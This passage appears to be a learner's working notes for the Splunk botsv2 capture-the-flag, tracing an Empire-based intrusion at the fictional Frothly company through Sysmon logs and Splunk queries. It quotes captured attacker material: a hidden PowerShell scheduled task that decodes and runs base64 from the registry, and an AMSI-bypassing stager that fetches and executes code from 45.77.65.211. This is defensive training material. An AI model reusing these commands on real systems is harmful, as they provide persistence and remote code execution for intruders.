2017-08-24 03:59:57	10.0.2.109	160.153.91.7:21	nc.exe
2017-08-24 03:59:58	10.0.2.109	160.153.91.7:21	psexec.exe
2017-08-24 03:59:58	10.0.2.109	160.153.91.7:21	python-2.7.6.amd64.msi
2017-08-24 04:00:12	10.0.2.109	160.153.91.7:21	wget64.exe
2017-08-24 04:00:16	10.0.2.109	160.153.91.7:21	winsys64.dll
2017-08-24 04:00:16	10.0.2.109	160.153.91.7:21	나는_데이비드를_사랑한다.hwp
```

From earlier search, taking more in depth look at those related to other command listed for FTP using winsys64.dll we have 3 events:
```
index=botsv2  sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" powershell cmdline="\"C:\\Windows\\system32\\ftp.exe\"  -i -s:winsys64.dll"
```
It turns out they are also repeated with winsys32.dll:
```
index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" powershell winsys32.dll
```
Here the two sets are combined:
```
Date			Host			User			FTP Script		Cookie
24 Aug 03:36	wrk-btun	billy.tun		winsys32.dll	lrtRHKkA6IL5h/d8Ekk6QsxyPvk=
24 Aug 04:00	wrk-klagerf	service3		winsys32.dll	MvCdddPqFQ54VL4OWU5ryRTUir8=
24 Aug 04:07	venus		service3		winsys32.dll	MvCdddPqFQ54VL4OWU5ryRTUir8=
26 Aug 05:28	wrk-klagerf	service3		winsys64.dll	MvCdddPqFQ54VL4OWU5ryRTUir8=
26 Aug 05:42	wrk-btun	billy.tun		winsys64.dll	lrtRHKkA6IL5h/d8Ekk6QsxyPvk=
26 Aug 06:13	wrk-btun	billy.tun		winsys64.dll	lrtRHKkA6IL5h/d8Ekk6QsxyPvk=
```

Looking closer these look likely post compromise activity downloading the same events encoded script from earlier finding:

Source IP		Destination IP	Destination Port
10.0.2.109		160.153.91.721 (FTP)					

Where ['/admin/get.php'](https://45.77.65.211/admin/get.php) is likely path to attackers server.
```
Time (UTC)			Host		User				Child Process				Parent Process
2017-08-24 03:36:49	wrk-btun	FROTHLY\billy.tun	ftp.exe -i -s:winsys32.dll	powershell.exe -NoP -NonI -W Hidden -enc ...
2017-08-24 04:00:30	wrk-klagerf	FROTHLY\service3	ftp.exe -i -s:winsys32.dll	powershell.exe -nop -sta -w 1 -enc ...
2017-08-24 04:07:27	venus		FROTHLY\service3	ftp.exe -i -s:winsys32.dll	powershell.exe -nop -sta -w 1 -enc ...
2017-08-26 05:28:57	wrk-klagerf	FROTHLY\service3	ftp.exe -i -s:winsys64.dll	powershell.exe -nop -sta -w 1 -enc ...
2017-08-26 05:42:06	wrk-btun	FROTHLY\billy.tun	ftp.exe -i -s:winsys64.dll	powershell.exe -NoP -NonI -W Hidden -enc ...
2017-08-26 06:13:34	wrk-btun	FROTHLY\billy.tun	ftp.exe -i -s:winsys64.dll	powershell.exe -NoP -NonI -W Hidden -enc ...
```

**Observation**

Observation				Details
Earliest event			03:36:49 on billy.tun
Same malware			All events contain the same Empire stager that reaches out to 45.77.65.211:443/admin/get.php
Same follow-on action	All launch ftp.exe -i -s:winsys32.dll or winsys64.dll 
Different accounts		service3 and billy.tun
Different hosts			wrk-klagerf, venus and wrk-btun
Likely significance		Indicates compromise of multiple systems, or lateral movement using the same Empire payload


**This korean file was downloaded and empire run on two machines:**

**wrk-btun**

- 03:36:34.077 FTP transfer of: 나는_데이비드를_사랑한다.hwp
- 03:36:49.192 powershell.exe (Empire stager)
				↓
		ftp.exe -i -s:winsys32.dll

About 15 seconds later

**wrk-klagerf**
- 04:00:16.831 FTP transfer of: 나는_데이비드를_사랑한다.hwp
- 04:00:30.683 powershell.exe (Empire stager)
				↓
		ftp.exe -i -s:winsys32.dll	

**What you can say is based on earliest 3 events:**

- The HWP transfer and the Empire-spawned
- ftp.exe -i -s:winsys32.dll execution occurred
- within approximately 14 seconds of each other
- on the same compromise timeline.

HWP documents have historically been used in phishing and malware campaigns targeting Korean users because:

- They're common in South Korea.
- Like Office documents, they can contain embedded objects and exploit vulnerable software.
- Many threat actors have used malicious HWP attachments to deliver payloads.

I think the answer is more likely Billy Tun than Ryan Kovar which does not seem related.
Just one email with kovar@yahoo.com.tw ryan appears part of name in 18 emails not with kovar same event.



**Q5 Within the document, what kind of points is mentioned if you found the text?**

- This relates not to what was just covered but the invoice.zip file from earlier its a little out of place.
- From the file that contained the interesting code in base64 that was clearly the invoice.zip file.
- Convert to single line dropping returnlines and end space this worked for me in linux:
```
		grep -o '[A-Za-z0-9+/=]\+' invoiceb64.txt | tr -d '\n' > b64.txt
```
- Decode
```
		base64 -d cleaned.txt > invoice_decodedb64.zip
```
- unzip using password from earlier and you get invoice.doc produced
```
		unzip invoice_decodedb64.zip
```
Answer is found int invoice.doc: Congrats! It looks like you have a virustotal account and chose to live on the edge. If you find this… turn it in for some CyberEastEgg points!!! 


**Q6 To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer example: index.php or images.html**

Starting with index=botsv2 *schtasks*

To make it more viewable:

```
index=botsv2 schtasks.exe
| table _time host user CommandLine ParentImage powershell
```
Three occur in time ranges expected 
```
2017-08-24 03:45:03	wrk-btun	FROTHLY\billy.tun	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	 

2017-08-24 03:45:03	wrk-btun	billy.tun	 	 	 

2017-08-24 04:12:36	venus	FROTHLY\service3	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	 

2017-08-24 04:12:36	venus	service3	 	 	 

2017-08-24 04:04:27	wrk-klagerf	 	 	 	 

2017-08-24 04:04:26	wrk-klagerf	FROTHLY\service3	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:39 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```
Simplify with just *schtasks* and interesting fields commandline there are 10 those, all three admin.php is in first one. So sort of dead end.
Its beaconing so try:
```
index=botsv2 45.77.65.211
| top uri
```
Results were, no link if using *schtask* 
```
uri            count            percent
/member.php	   594              12.237330
/search.php	   164              3.378657
/              43               0.885867
/admin/        3                0.061805
/~www-data/    2                0.041203
/~debian-tor/  2                0.041203
/~Debian-exim/ 2                0.041203
/www/	       2                0.041203
/www-data/     2                0.041203
/wp-login.php  2                0.041203
```
Dropping the uri, jupitor, growler, gacrux, and venus seem to be most connections made to C2 IP.
```
only 5 hosts were connected to
jupiter 	86,737 	51.625% 	
growler 	48,397 	28.805% 	
gacrux 	28,307 	16.848% 	
venus 	4,572 	2.721% 	
ec2-52-40-10-231.us-west-2.compute.amazonaws.com:8088 	1 	0%
```
Most connections appear to be from 2 familar IP seen before:
```
src_ip

Events with this field
Values         Count 	% 	 
10.0.2.107     50,846 	32.104% 	
10.0.2.109     33,489 	21.144% 	
10.0.1.100     27,778 	17.539% 	
10.0.1.101     27,457 	17.336% 	
45.77.65.211   18,811 	11.877%
```
Combining:
```
index=botsv2 index=botsv2 45.77.65.211 uri
| stats count by src_ip
```
Source likely still uses members.php as most common connection to same IP. Looks like members.php is the answer that makes sense, but the actual answer is process.php. It only appears in one event in base64 code. 
Using (show zero results):
```
index=botsv2 process.php
```
It appears in a near identical payload to that shown earlier, only process.php is in it:
```
[REF].ASSeMBlY.GEtTypE('System.Management.Automation.AmsiUtils....$ser='https://45.77.65.211:443';$t='/login/process.php';$DaTA=$WC.DowNloAdDATA($sEr $T);$iv=$DaTA[0..3];$dAta=$data[4..$datA.lenGTH];-jOiN[ChAr[]](& $R $dATA ($IV $K))|IEX
```
This can be found is and starts after most earlier payloads delivered at 4:04:26
```
using "index=botsv2 HKLM\\software\\microsoft\\network" there are 4 results and 3rd one or second done the first was similar to admin/get.php earlier found not process.php 8/24/17
4:04:26.000 AM	
08/23/2017 21:04:26.827
event_status="(0)The operation completed successfully."
pid=2936
process_image="c:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
registry_type="SetValue"
key_path="HKLM\software\microsoft\network\debug"
data_type="REG_SZ"
data="WwBSAEUARgBdAC4.....ADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQARABhAFQAQQA9ACQAVwBDAC4ARABvAHcATgBsAG8AQQBkAEQAQQBUAEEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQARABhAFQAQQBbADAALgAuADMAXQA7ACQAZABBAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAQQAuAGwAZQBuAEcAVABIAF0AOwAtAGoATwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA" data section ends with the above address.
```

